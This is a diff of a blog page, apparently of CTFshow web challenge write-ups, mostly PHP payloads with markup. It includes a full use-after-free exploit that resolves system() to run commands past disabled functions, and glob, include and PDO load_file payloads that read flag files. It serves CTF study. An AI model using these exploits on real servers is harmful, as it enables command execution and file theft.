class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$backtrace</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line"><span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line"><span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line"><span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$out</span> .= sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line"><span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line"><span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line"><span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line"><span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line"><span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line"><span class="variable">$p_type</span> = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line"><span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line"><span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line"><span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line"><span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123;</span><br><span class="line"><span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line"><span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line"><span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line"><span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line"><span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arg</span> = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"><span class="variable">$vuln</span> = <span class="keyword">new</span> Vuln();</span><br><span class="line"><span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$n_alloc</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$contiguous</span> = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line"><span class="variable">$contiguous</span>[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line"><span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line"><span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>);</span><br><span class="line"></span><br><span class="line">(<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br><span class="line"><span class="comment">#需要通过url编码，带着空格和换行符</span></span><br></pre></td></tr></table></figure>
 
-globx协议:查找匹配的文件路径模式![image-20220220154722677](./CTFshow-2/image-20220220154722677.png)
+<p>globx协议:查找匹配的文件路径模式<img src="/2022/03/08/CTFshow-2/image-20220220154722677.png" alt="image-20220220154722677"></p>
+<h2 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"> printf(<span class="variable">$f</span>-&gt;getFilename().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">都可，在flagc.txt里面</span><br><span class="line"></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
 
-## web73
+<h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flagx.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
 
-c=?><?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f){
+<h2 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-echo($f->__toString().' ');} exit() ?>
-
-<p>c=?&gt;&lt;?php $a=new DirectoryIterator(“glob:///*”); foreach($a as $f){</p>
-<p> printf($f-&gt;getFilename().’ ‘);} exit() ?&gt;</p>
-<p>都可，在flagc.txt里面</p>
-<p>c=include(“/flagc.txt”);exit();</p>
-<h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><p>c=?&gt;&lt;?php $a=new DirectoryIterator(“glob:///*”); foreach($a as $f){</p>
-<p>echo($f-&gt;__toString().’ ‘);} exit() ?&gt;</p>
-<p>c=include(“/flagx.txt”);exit();</p>
-<h2 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h2><p>c=?&gt;&lt;?php $a=new DirectoryIterator(“glob:///*”); foreach($a as $f){</p>
-<p>echo($f-&gt;__toString().’ ‘);} exit() ?&gt;</p>
 <p>在flag36.txt</p>
 <p>include 无法使用，可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag，payload如下：</p>
-<p>c=try {$dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’, ‘root’);foreach($dbh-&gt;query(‘select load_file(“/flag36.txt”)’) as $row) {echo($row[0]).”|”; }$dbh = null;}catch (PDOException $e) {echo $e- &gt;getMessage();<strong>exit</strong>(0);}<strong>exit</strong>(0);</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;<span class="variable">$dbh</span> = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);foreach(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) as <span class="variable">$row</span>) &#123;echo(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = null;&#125;catch (PDOException <span class="variable">$e</span>) &#123;echo <span class="variable">$e</span>- &gt;getMessage();**<span class="keyword">exit</span>**(<span class="number">0</span>);&#125;**<span class="keyword">exit</span>**(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+
+
 <p>在<strong>PDO</strong>中，我们可以使用三种方式来执行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">SQL语句</a>，分别是 exec()方法，query方法，以及预处理语句prepare()和execute()方法</p>
 <p><img src="/2022/03/08/CTFshow-2/image-20220220163455540.png" alt="image-20220220163455540"></p>
 <p>exec()方法返回执行SQL 语句后受影响的行数，其语法格式如下：</p>
@@ -537,13 +441,16 @@ echo($f->__toString().' ');} exit() ?>
 <p>第三种种方法：预处理语句：prepare()语句和execute()语句</p>
 <p>预处理语句包括prepare()和execute()两种方法。首先，通过prepare()方法做查询准备工作，然后通过execute()方法执行查询，并且还可以通过bindParam()方法来绑定参数给execute()方法</p>
 <p><strong>php中的“-&gt;”符号</strong>被称为箭头<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BF%90%E7%AE%97%E7%AC%A6&spm=1001.2101.3001.7020">运算符</a>，箭头运算符左侧是获取类的实例，右侧将指定左侧类的方法和属性并进行<strong>调用</strong></p>
-<h2 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h2><p>c=?&gt;&lt;?php $a=new DirectoryIterator(“glob:///*”); foreach($a as $f){</p>
-<p>echo($f-&gt;__toString().’ ‘);} exit() ?&gt;</p>
+<h2 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>在flag36d.txt</p>
-<p>c=try {$dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’, ‘root’);foreach($dbh-&gt;query(‘select load_file(“/flag36d.txt”)’) as $row) {echo($row[0]).”|”; }$dbh = null;}catch (PDOException $e) {echo $e -&gt; getMessage();exit(0);}exit(0);</p>
